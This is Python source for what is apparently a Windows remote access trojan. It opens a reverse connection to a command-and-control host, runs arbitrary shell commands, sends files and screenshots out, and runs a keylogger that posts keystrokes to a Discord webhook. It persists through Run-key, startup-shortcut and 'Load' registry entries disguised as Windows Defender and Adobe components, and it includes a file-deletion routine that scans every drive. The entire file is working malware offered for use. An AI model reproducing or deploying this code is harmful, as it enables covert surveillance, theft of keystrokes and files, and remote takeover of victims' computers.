import argparse
import base64
import io
import logging
import string
import psutil
import pyautogui
import socket
import subprocess
import sys
import time
import threading
import keyboard
from datetime import datetime
from dhooks import Webhook, Embed
from pathlib import Path
import winreg
import os
from win32com.client import Dispatch

# ===== CONFIGURATION =====
C2ServerHost = "127.0.0.1"  # REPLACE WITH SERVER / Cloudflare or Ngrok Host
PORT = 4444
RETRY_DELAY = 10
HEADER_SIZE = 8
SEPARATOR = "<sep>"
SEND_REPORT_EVERY = 60
WEBHOOK_URL = "https://discord.com/api/webhooks/1388666887961055293/tbfynwxYhEe8sjVFBl7E2te4dVq5qCknLXqrJjQUo0h5GxEb59PU0945GVgFRCM1BhW7"  # Replace with actual webhook

# ===== LOGGING SETUP =====
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)


class ShellSession:
    def __init__(self):
        self.cwd = os.getcwd()

    def execute(self, command: str) -> str:
        if command.lower().startswith("cd "):
            return self.change_directory(command[3:].strip())
        elif command.lower().startswith("download "):  # Add this
            return self.handle_download(command[9:].strip())

        try:
            proc = subprocess.run(
                command,
                shell=True,
                cwd=self.cwd,
                capture_output=True,
                text=True,
                timeout=30
            )
            return proc.stdout or proc.stderr or ""
        except subprocess.TimeoutExpired:
            return "Command timed out"
        except Exception as e:
            return str(e)

    def change_directory(self, new_dir: str) -> str:
        try:
            target = Path(self.cwd).joinpath(new_dir).resolve() if new_dir else Path.home()
            if not target.exists():
                return f"Directory not found: {target}"
            os.chdir(str(target))
            self.cwd = str(target)
            return f"Changed to {self.cwd}"
        except Exception as e:
            return f"cd failed: {e}"

    def handle_download(self, filename: str) -> str:
        try:
            filepath = Path(self.cwd).joinpath(filename).resolve()
            if not filepath.exists():
                return f"File not found: {filename}"

            with open(filepath, 'rb') as f:
                file_content = f.read()

            # Format: <FILE_START><filename><SEPARATOR><base64_encoded_content><FILE_END>
            return (f"<FILE_START>{filename}{SEPARATOR}"
                    f"{base64.b64encode(file_content).decode()}<FILE_END>")
        except Exception as e:
            return f"Download failed: {e}"

class ConnectionHandler:
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.sock = None

    def connect(self) -> bool:
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.settimeout(10)  # Connection timeout
            logging.info(f"Attempting to connect to {self.host}:{self.port}")
            self.sock.connect((self.host, self.port))
            self.sock.settimeout(60)  # Operation timeout
            logging.info(f"Successfully connected to {self.host}:{self.port}")
            return True
        except socket.timeout:
            logging.error(f"Connection to {self.host}:{self.port} timed out")
        except ConnectionRefusedError:
            logging.error(f"Connection refused - is server running on {self.host}:{self.port}?")
        except Exception as e:
            logging.error(f"Connection error: {str(e)}")
        return False

    def send_message(self, message: str | bytes) -> bool:
        try:
            if isinstance(message, str):
                message = message.encode()
            header = f"{len(message):<{HEADER_SIZE}}".encode()
            self.sock.sendall(header + message)
            return True
        except Exception as e:
            logging.error(f"Send failed: {e}")
            return False

    def recv_message(self) -> str | None:
        try:
            header = self.sock.recv(HEADER_SIZE)
            if not header:
                logging.warning("Server closed connection")
                return None
            msg_len = int(header.decode().strip())
            data = self.sock.recv(msg_len)
            if not data:
                logging.warning("Server closed connection during transfer")
                return None
            return data.decode()
        except socket.timeout:
            logging.warning("Receive operation timed out")
            return None
        except Exception as e:
            logging.error(f"Receive failed: {e}")
            return None

    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except:
                pass
            self.sock = None


class Keylogger:
    def __init__(self, interval: int):
        self.interval = interval
        self.log = ""
        self.hook = Webhook(WEBHOOK_URL) if WEBHOOK_URL else None
        self.running = False

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            name = {
                'space': ' ',
                'enter': '[ENTER]\n',
                'decimal': '.',
                'backspace': '[BACKSPACE]',
                'tab': '[TAB]'
            }.get(name, f'[{name.upper()}]')
        self.log += name

    def report(self):
        if self.running and self.log and self.hook:
            try:
                self.hook.send(f"**Keylog {datetime.now()}**\n```\n{self.log[:1900]}\n```")
                self.log = ""
            except Exception as e:
                logging.error(f"Webhook error: {e}")

        if self.running:
            threading.Timer(self.interval, self.report).start()

    def start(self):
        if not self.running:
            self.running = True
            keyboard.on_release(self.callback)
            self.report()
            logging.info("Keylogger started")

    def stop(self):
        if self.running:
            self.running = False
            keyboard.unhook_all()

def delete_first_match(target_name, exact=True):
    # Get all drive letters
    drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]

    for drive in drives:
        print(f"Scanning: {drive}")
        for root, dirs, files in os.walk(drive, topdown=True):
            # Skip known system dirs
            dirs[:] = [d for d in dirs if d not in ('Windows', 'Program Files', 'Program Files (x86)', '$Recycle.Bin')]

            # Check folders
            for dir_name in dirs:
                if (exact and dir_name == target_name) or (not exact and target_name.lower() in dir_name.lower()):
                    path = os.path.join(root, dir_name)
                    try:
                        os.rmdir(path)  # remove empty folder
                        print(f"Deleted folder: {path}")
                    except Exception as e:
                        print(f"Failed to delete folder {path}: {e}")
                    return

            # Check files
            for file_name in files:
                if (exact and file_name == target_name) or (not exact and target_name.lower() in file_name.lower()):
                    path = os.path.join(root, file_name)
                    try:
                        os.remove(path)
                        print(f"Deleted file: {path}")
                    except Exception as e:
                        print(f"Failed to delete file {path}: {e}")
                    return

    print("No matching file or folder found.")

def is_process_running(process_name):
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name'] == process_name:
                    return True
            except psutil.NoSuchProcess:
                continue
        return False



def add_to_startup_no_admin():
    try:
        target = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else sys.argv[0])

        # ===== 1. Current User Registry (Most Reliable) =====
        with winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
        ) as reg_key:
            # Use quotes and random-looking name
            winreg.SetValueEx(
                reg_key,
                "WindowsDefenderUpdate",  # Disguised name
                0,
                winreg.REG_SZ,
                f'"{target}" --silent'  # Hidden execution flag
            )

        # ===== 2. Startup Folder Alternative =====
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
        )
        os.makedirs(startup_folder, exist_ok=True)

        # Create disguised shortcut
        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortCut(os.path.join(startup_folder, "AdobeGCIManager.lnk"))
        shortcut.TargetPath = target
        shortcut.WorkingDirectory = os.path.dirname(target)
        shortcut.IconLocation = "imageres.dll,1"  # Use generic icon
        shortcut.save()

        # ===== 3. Hidden Registry Location =====
        with winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows NT\CurrentVersion\Windows",
                0, winreg.KEY_SET_VALUE
        ) as reg_key:
            # Append to existing 'load' value if it exists
            try:
                current_load = winreg.QueryValueEx(reg_key, "Load")[0]
                if target not in current_load:
                    new_load = f"{current_load} {target}"
                    winreg.SetValueEx(reg_key, "Load", 0, winreg.REG_SZ, new_load)
            except FileNotFoundError:
                winreg.SetValueEx(reg_key, "Load", 0, winreg.REG_SZ, target)

    except Exception as e:
        logging.error(f"Persistence error: {e}")
        return False

def close_app(app_name):
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] == app_name:
            proc.terminate()
            print(f"{app_name} terminated")
            return
def main():
    while True:
        try:
            conn = ConnectionHandler(C2ServerHost, PORT)
            if conn.connect():
                session = ShellSession()
                while True:
                    cmd = conn.recv_message()
                    if cmd is None:
                        logging.warning("Server disconnected")
                        break
                    if cmd.lower() == 'exit':
                        break

                    response = session.execute(cmd)
                    if cmd.lower().startswith(".screenshot"):
                        try:
                            screenshot = pyautogui.screenshot()
                            with io.BytesIO() as output:
                                screenshot.save(output, format="PNG")
                                response = base64.b64encode(output.getvalue()).decode()
                        except Exception as e:
                            response = f"Screenshot failed: {e}"

                    if not conn.send_message(f"{response}{SEPARATOR}{session.cwd}"):
                        break
            time.sleep(RETRY_DELAY)
        except KeyboardInterrupt:
            break
        except Exception as e:
            logging.error(f"Error: {e}")
            time.sleep(RETRY_DELAY)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        logging.critical(f"Fatal error: {e}")
        sys.exit(1)